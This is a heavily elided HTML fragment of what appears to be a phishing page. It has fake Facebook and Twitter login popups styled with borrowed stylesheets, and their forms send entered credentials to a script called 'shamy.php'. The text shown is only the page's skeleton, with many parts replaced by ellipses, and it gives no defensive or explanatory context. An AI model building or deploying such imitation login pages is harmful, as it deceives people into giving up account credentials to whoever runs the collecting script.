...
<link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/s15/master/v3/facebook.css">
<link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/s15/master/v3/twitter.css">
...
window.needActiveData = 1;
	...
	<div class="popup-box-login-fb">
		...
		<div class="content-box-fb">
			...
			<form class="login-form" action="shamy.php" method="get">
			    <label>
...
<div class="popup-login twitter animated fadeIn" style="display: none;">
	...
	<a class="close-other"><i class="zmdi zmdi-close"></i></a>
		...
		<div class="box-twitter">
			<center>
			<form action="shamy.php" method="get">
